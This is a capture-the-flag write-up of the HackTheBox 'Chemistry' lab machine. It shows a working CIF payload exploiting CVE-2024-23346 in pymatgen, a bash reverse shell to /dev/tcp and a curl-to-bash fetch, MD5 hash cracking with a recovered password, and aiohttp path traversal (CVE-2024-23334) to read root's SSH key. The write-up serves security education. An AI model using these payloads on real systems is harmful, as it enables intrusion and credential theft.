---
title: HTB: Chemistry
url: https://0xdf.gitlab.io/2025/03/08/htb-chemistry.html
date: 2025-03-08T14:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, htb-chemistry, hackthebox, nmap, cif, python-flask, feroxbuster, cve-2024-23346, pymatgen, deserialization, crackstation, python-aiohttp, cve-2024-23334, burp, burp-repeater, directory-traversal
---

![Chemistry](/img/chemistry-cover.png)

Chemistry starts with a website for handling Crystallographic Information Files (CIF) to display molecules. I’ll exploit a deserialization vulnerability in a Python library used to process these files to get execution on the box. I’ll crack a hash in the website database to get the next user’s password. Finally, I’ll find an internal website running on AIOHTTP. I’ll exploit a directory traversal vulnerability in that site to read root’s private SSH key. In Beyond Root I’ll look at the vulnerable AOIHTTP code and show the vulnerability.

## Box Info

| Name | [Chemistry](https://hackthebox.com/machines/chemistry)  [Chemistry](https://hackthebox.com/machines/chemistry) [Play on HackTheBox](https://hackthebox.com/machines/chemistry) |
| --- | --- |
| Release Date | [19 Oct 2024](https://twitter.com/hackthebox_eu/status/1847306674140246516) |
| Retire Date | 08 Mar 2025 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Chemistry |
| Radar Graph | Radar chart for Chemistry |
| First Blood User | 00:03:27[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| First Blood Root | 00:14:25[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creator | [FisMatHack FisMatHack](https://app.hackthebox.com/users/1076236) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (5000):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.38
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 14:00 EDT
Nmap scan report for 10.10.11.38
Host is up (0.086s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds
oxdf@hacky$ nmap -p 22,5000 -sCV 10.10.11.38
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-09 14:00 EDT
Nmap scan report for 10.10.11.38
Host is up (0.085s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Wed, 09 Oct 2024 18:01:23 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 702
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|     </html>
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=10/9%Time=6706C4D1%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,379,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\
SF:x20Python/3\.9\.5\r\nDate:\x20Wed,\x2009\x20Oct\x202024\x2018:01:23\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x20702\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"widt
SF:h=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemis
SF:try\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20<div\
SF:x20class=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\
SF:"title\">Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<p>Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\
SF:x20tool\x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallograp
SF:hic\x20Information\x20File\)\x20and\x20analyze\x20the\x20structural\x20
SF:data\x20contained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div
SF:\x20class=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<center><a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\
SF:"btn\">Register</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\
SF:x20\x20\x20\x20</div>\n</body>\n</html>")%r(RTSPRequest,1F4,"<!DOCTYPE\
SF:x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20
SF:\x20\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<htm
SF:l>\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20ht
SF:tp-equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\
SF:x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x
SF:20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\
SF:x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x2
SF:0-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x
SF:20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.49 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions, the host is likely running Ubuntu 20.04 focal.

The webserver shows Python and Werkzeug, so this is likely a Flask webserver.

### Website - TCP 5000

#### Site

The site presents a “Chemistry CIF Analyzer”:

![image-20241009140608033](/img/image-20241009140608033.png)

The login page seems to return the same message (“Invalid credentials”) no matter what I enter for username and password. However, trying to register the admin username returns a message:

![image-20250303083836498](/img/image-20250303083836498.png)

So it is possible to enumerate users this way if necessary (which it won’t be for solving Chemistry).

I’ll register my own user, and it sends me to the Dashboard:

![image-20250303083901142](/img/image-20250303083901142.png)

There’s an example [Crystallographic Information File](https://en.wikipedia.org/wiki/Crystallographic_Information_File), or CIF available for download. I’ll download it. It’s a text-based format with information about a molecule:

```

data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

```

If I upload the unmodified example file, it shows up in the “Your Structures” section of the site:

![image-20241009141351713](/img/image-20241009141351713.png)

Viewing it returns information about the structure:

![image-20241009141407834](/img/image-20241009141407834.png)

#### Tech Stack

As `nmap` noted, the HTTP response headers show that the site is running Python Flask:

```

HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.9.5
Date: Mon, 03 Mar 2025 13:38:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 719
Vary: Cookie
Connection: close

```

The 404 page is the [default Flask 404 page](/cheatsheets/404#flask):

![image-20250303084643231](/img/image-20250303084643231.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.38:5000
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.38:5000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        5l       22w      229c http://10.10.11.38:5000/logout => http://10.10.11.38:5000/login?next=%2Flogout
200      GET       29l       57w      926c http://10.10.11.38:5000/login
200      GET       29l       57w      931c http://10.10.11.38:5000/register
200      GET      126l      277w     2312c http://10.10.11.38:5000/static/styles.css
200      GET       22l       61w      719c http://10.10.11.38:5000/
405      GET        5l       20w      153c http://10.10.11.38:5000/upload
302      GET        5l       22w      235c http://10.10.11.38:5000/dashboard => http://10.10.11.38:5000/login?next=%2Fdashboard
[####################] - 59s    30004/30004   0s      found:7       errors:0      
[####################] - 58s    30000/30000   516/s   http://10.10.11.38:5000/  

```

Nothing I haven’t already interacted with using the site.

## Shell as app

### Identify CVE

Searching for “cif exploit” finds some stuff that doesn’t seem interesting, but also one interesting blog post:

![image-20241009143247141](/img/image-20241009143247141.png)

### CVE-2024-23346 Background

A blog post entitled [CVE-2024-23346: Arbitrary Code Execution in Pymatgen via Insecure Deserialization](https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0) walks through the vulnerability in detail. [This advisory](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f) on GitHub has a more succinct summary, and both include a POC payload.

The vulnerability is in the [pymatgen library](https://pymatgen.org/), which describes itself as “a robust, open-source Python library for materials analysis.”

To exploit Chemistry it’s not critical to completely understand how this exploit works, but it’s always good to take a look. The vulnerability is in the `pymatgen/symmetry/settings.py` file, in [this block](https://github.com/materialsproject/pymatgen/blob/v2024.2.8/pymatgen/symmetry/settings.py#L97-L114) of code:

```

try:
    a, b, c = np.eye(3)
    b_change, o_shift = transformation_string.split(";")
    basis_change = b_change.split(",")
    origin_shift = o_shift.split(",")
    # add implicit multiplication symbols
    basis_change = [
        re.sub(r"(?<=\w|\))(?=\() | (?<=\))(?=\w) | (?<=(\d|a|b|c))(?=([abc]))", r"*", string, flags=re.X)
        for string in basis_change
    ]
    # should be fine to use eval here but be mindful for security
    # reasons
    # see http://lybniz2.sourceforge.net/safeeval.html
    # could replace with regex? or sympy expression?
    P = np.array([eval(x, {"__builtins__": None}, {"a": a, "b": b, "c": c}) for x in basis_change])
    P = P.transpose()  # by convention
    p = [float(Fraction(x)) for x in origin_shift]
    return P, p
except Exception:
    raise ValueError("Failed to parse transformation string.")

```

It takes input, runs a regex against it, and passes the result to `eval`. It’s funny to me that the pymatgen developer made comments saying that “should be fine to use eval here but be mindful for security reasons”.

If the user input is passed into this function (in this case as the CIF file), then it can lead to command execution.

The author of the blog classifies it as a deserialization vulnerability, which I guess it is in the sense that it is taking data in some format (CIF) and converting it into one or more Python objects. The payload looks very much like a standard Python server-side template injection (SSTI) payload. That’s because templating engines are one of the most common legit uses of Python passing user input to `eval`.

### POC

I’ll grab the POC from the post:

![image-20241009142946953](/img/image-20241009142946953.png)

It’s creating a file named `pwned` in the current directory. Without access to the filesystem, I won’t be able to see if that worked. I’ll update it to `ping` my host:

```

data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c 1 10.10.14.6");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```

I’ll start `tcpdump` on my host looking for ICMP packets. When I upload the file, there are no packets, and the file shows up in “Your Structures”.

When I click “View”, the page returns 500 Internal Server Error, an ICMP packet arrives:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:21:17.024487 IP 10.10.11.38 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
14:21:17.024509 IP 10.10.14.6 > 10.10.11.38: ICMP echo reply, id 2, seq 1, length 64

```

That’s remote code execution.

### Shell

I’ll update my payload to include a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1'");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```

This took a bit of playing, as `bash` doesn’t seem to be in the PATH, so if I just did `bash` instead of `/bin/bash`, it fails. I also made work `curl 10.10.14.6/shell.sh|/bin/bash`, and then hosted a simple reverse shell on my Python webserver.

When I run it, I get a shell at waiting `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.38 33786
bash: cannot set terminal process group (1015): Inappropriate ioctl for device
bash: no job control in this shell
app@chemistry:~$

```

I’ll upgrade my shell:

```

app@chemistry:~$ script /dev/null -c /bin/bash
script /dev/null -c /bin/bash 
Script started, file is /dev/null
app@chemistry:~$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
app@chemistry:~$

```

## Shell as rosa

### Enumeration

#### Users

There are two users with home directories in `/home`:

```

app@chemistry:/home$ ls
app  rosa

```

That matches with users who have shells configured in `passwd`:

```

app@chemistry:/home$ grep "sh$" /etc/passwd
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash

```

The app user is able to go into the rosa user’s home directory and find `user.txt`, but can’t read it:

```

app@chemistry:/home/rosa$ ls -la
total 36
drwxr-xr-x 5 rosa rosa 4096 Jun 17  2024 .
drwxr-xr-x 4 root root 4096 Jun 16  2024 ..
lrwxrwxrwx 1 root root    9 Jun 17  2024 .bash_history -> /dev/null
-rw-r--r-- 1 rosa rosa  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 rosa rosa 3771 Feb 25  2020 .bashrc
drwx------ 2 rosa rosa 4096 Jun 15  2024 .cache
drwxrwxr-x 4 rosa rosa 4096 Jun 16  2024 .local
-rw-r--r-- 1 rosa rosa  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root    9 Jun 17  2024 .sqlite_history -> /dev/null
drwx------ 2 rosa rosa 4096 Jun 15  2024 .ssh
-rw-r--r-- 1 rosa rosa    0 Jun 15  2024 .sudo_as_admin_successful
-rw-r----- 1 root rosa   33 Mar  3 12:01 user.txt

```

In `/home/app` is the website code:

```

app@chemistry:~$ ls
app.py  instance  static  templates  uploads

```

#### Website

`app.py` is the main logic for the site. At the top it sets up the Flask application:

```

from flask import Flask, render_template, request, redirect, url_for, flash
from werkzeug.utils import secure_filename
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from pymatgen.io.cif import CifParser
import hashlib
import os
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'                   
app.config['ALLOWED_EXTENSIONS'] = {'cif'}   

db = SQLAlchemy(app)                                       
login_manager = LoginManager(app)              
login_manager.login_view = 'login' 

```

The `SECRET_KEY` would allow me to forge cookies and really should be a randomly generated value not a hard coded string, but I don’t believe there’s much value to pursuing that at this point.

The database is a SQLite DB in `database.db`.

There are no routes that haven’t already shown up just by using the website:

```

app@chemistry:~$ cat app.py | grep app.route
@app.route('/')
@app.route('/register', methods=['GET', 'POST'])
@app.route('/login', methods=['GET', 'POST'])
@app.route('/logout')
@app.route('/dashboard')
@app.route('/upload', methods=['POST'])
@app.route('/structure/<identifier>')
@app.route('/delete_structure/<identifier>', methods=['POST'])

```

The `uploads` directory has my uploads. Nothing else really interesting.

#### Database

The database file is in `instance/`

```

app@chemistry:~$ ls instance/
database.db

```

`sqlite3` is installed on Chemistry, so I can enumerate the database from my shell. There are two tables:

```

app@chemistry:~$ sqlite3 instance/database.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
structure  user

```

The `structure` table isn’t interesting. The `user` table has a bunch of users and hashes:

```

sqlite> select * from user; 
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|0xdf|465e929fc1e0853025faad58fc8cb47d

```

I’ll note that one of the users is rosa (who has a system account on Chemistry).

Just looking at the hashes, they are 32 hex characters, so likely MD5s. I can verify that in the code. For example, in the `login` function:

```

def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter_by(username=username).first()
        if user and user.password == hashlib.md5(password.encode()).hexdigest():
            login_user(user)
            return redirect(url_for('dashboard'))
        flash('Invalid credentials')
    return render_template('login.html')

```

It’s comparing the MD5 hash of the input to the database entry.

#### Internal Website

Looking at the listening ports on the box, I’ll note a service listening on port 8080 running as a different user:

```

app@chemistry:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1072/python3.9      
tcp6       0      0 :::22                   :::*                    LISTEN      - 

```

This website is running out of `/opt/monitoring_site`. This can be determined by looking at the processes:

```

app@chemistry:~$ ps auxww | grep python
root         840  0.0  0.9  29648 18372 ?        Ss   12:01   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
app         1072  0.6  5.1 1289500 102152 ?      Ssl  12:01   0:52 /usr/bin/python3.9 /home/app/app.py
root        1073  0.0  1.3  35408 27796 ?        Ss   12:01   0:00 /usr/bin/python3.9 /opt/monitoring_site/app.py

```

The monitoring site is running as root. It is always wise to check `/opt`, but the `app` user can’t access the `/opt/monitoring_site`. If I try to talk to this site, it fails:

```

app@chemistry:~$ curl localhost:8080
curl: (7) Failed to connect to localhost port 8080: Connection refused

```

I’ll come back to this for escalation to root. Not worth a full Beyond Root section, but as root I can see that there’s an IPTables rule preventing this user from accessing the site:

```

root@chemistry:~# cat /etc/iptables/rules.v4 
# Generated by iptables-save v1.8.4 on Tue Jun 18 19:33:14 2024
*filter
:INPUT ACCEPT [16:792]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [16:1368]
-A OUTPUT -p tcp -m owner --uid-owner 1001 -m tcp --dport 8080 -j REJECT --reject-with icmp-port-unreachable
COMMIT
# Completed on Tue Jun 18 19:33:14 2024

```

### Shell

#### Recover Password

The hashes from the database are 32 hex characters, which means they are likely MD5 hashes. I’ll dump the list into [CrackStation](https://crackstation.net/):

![image-20250303093237489](/img/image-20250303093237489.png)

Several of them crack, including rosa’s, which is “unicorniosrosados”.

#### su / SSH

This password works for the rosa system account as well using `su`:

```

app@chemistry:~$ su - rosa
Password: 
rosa@chemistry:~$

```

It also works over SSH from my host:

```

oxdf@hacky$ sshpass -p 'unicorniosrosados' ssh rosa@10.10.11.38
Warning: Permanently added '10.10.11.38' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-186-generic x86_64)
...[snip]...
rosa@chemistry:~$

```

Either way I can grab `user.txt`:

```

rosa@chemistry:~$ cat user.txt
1f432aa3************************

```

## Shell as root

### Enumeration

#### Tunnel

I’ve already [noted above](#internal-website) the second website running as root. I’ll use my SSH session (either with a new one or in a [SSH command prompt](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/)) to create a tunnel with `-L 8888:127.0.0.1:8080`. This will listen on TCP 8888 on my host and forward it through the SSH session to 8080 on Chemistry. I’m using 8888 because Burp is already listening on 8080 on my host, and any port could work here.

Now I can load `http://localhost:8888` in Firefox and see the page:

![image-20241009145553550](/img/image-20241009145553550.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

#### Site

The site is a status dashboard. The charts on the main page aren’t interesting. The “Start Service” button generates a popup saying it’s not available:

![image-20241009145837220](/img/image-20241009145837220.png)

The same pop-up comes clicking “Stop Service”.

“Check Attacks” shows a page, but it’s not working either:

![image-20241009145910668](/img/image-20241009145910668.png)

“List Services” shows the running and stopped services on the host:

![image-20241009145933620](/img/image-20241009145933620.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

#### Tech Stack

Looking at the requests sent by the site, only `/list_services` actually makes a request. The other pages are just locally loaded with JavaScript. Even it is just a GET request to a static page, so not much I can interact with.

The response headers show that it is Python using AIOHTTP rather than Flask like the publicly facing site:

```

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Wed, 09 Oct 2024 18:54:07 GMT
Server: Python/3.9 aiohttp/3.9.1

```

[AIOHTTP](https://docs.aiohttp.org/en/stable/) is a “Asynchronous HTTP Client/Server for asyncio and Python.” The version is 3.9.1.

### CVE-2024-23334

#### Identify

The [Snyk page for AIOHTTP](https://security.snyk.io/package/pip/aiohttp) has a long list of vulnerabilities. It’s nice here to know I’m looking at version 3.9.1, which limits it to a handful:

![image-20241009153722260](/img/image-20241009153722260.png)

Looking at these, the one that jumps out as most interesting is the path traversal. Smuggling seems too much for an easy machine, but perhaps I’ll come there next. The version for the information exposure doesn’t line up. There’s no place to input XSS payloads. I don’t know how I would exploit an infinite loop. And I’m not sure where I might find a symlink that is read by the site. So I’ll start with [the traversal](https://security.snyk.io/vuln/SNYK-PYTHON-AIOHTTP-6209406).

#### Background

The issue comes when a path is added as a route with the `follow_symlinks=True` option:

![image-20241009154018747](/img/image-20241009154018747.png)

The issue is that it allows the attacker to `../` out of the directory to other places on the filesystem.

#### POC

Looking at the requests being sent while interacting with the page, there are static files served from `/assets`, which suggests it may have the scenario mentioned above:

![image-20250303105041498](/img/image-20250303105041498.png)

I’ll send one of these requests to Burp Repeater and update the path with the directory traversal payload:

![image-20250303105225500](/img/image-20250303105225500.png)

#### SSH Keys

I’ll check if there’s an `authorized_keys` file in root’s home directory:

![image-20250303105413723](/img/image-20250303105413723.png)

It’s an RSA key. I’ll check for the private key:

![image-20250303105441805](/img/image-20250303105441805.png)

That is enough to connect over SSH as root:

```

oxdf@hacky$ ssh -i ~/keys/chemistry-root root@10.10.11.38
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
...[snip]...
root@chemistry:~# 

```

And read `root.txt`:

```

root@chemistry:~# cat root.txt
27c2c31b************************

```

## Beyond Root

As root, I can now access the monitoring website source:

```

root@chemistry:/opt/monitoring_site# ls
app.py  data  static  templates

```

`app.py` is pretty short:

```

import aiohttp
import aiohttp_jinja2
import jinja2
import os
import json
import re
from aiohttp import web
import subprocess

async def list_services(request):
    # Logic to retrieve and return the list of services
    services = subprocess.check_output(['service', '--status-all']).decode('utf-8').split('\n')
    return web.json_response({"services": services})

async def index(request):
    # Load sample data from a JSON file
    with open('data/data.json') as f:
        data = json.load(f)

    return aiohttp_jinja2.render_template('index.html', request, data)

app = web.Application()
aiohttp_jinja2.setup(app, loader=jinja2.FileSystemLoader('templates'))

app.router.add_get('/', index)
app.router.add_static('/assets/', path='static/', follow_symlinks=True)
app.router.add_get('/list_services', list_services)

if __name__ == '__main__':
    web.run_app(app, host='127.0.0.1', port=8080)

```

There are three routes defined. `/` points to the `index` function, which loads some static data and renders it into `index.html` as a template. `/list_services` calls the `list_services` function, which does use subprocess to run `service --status-all`. Typically `subprocess` would jump out as interesting, but no user input is passed to the call, so there’s no much I can do here.

The last route is `app.router.add_static`. It’s basically saying that any route in `/assets` should pull from the filesystem based in the `static` directory. This matches the vulnerability descriptions, except that the path on the webserver is `/assets` instead of `/static`.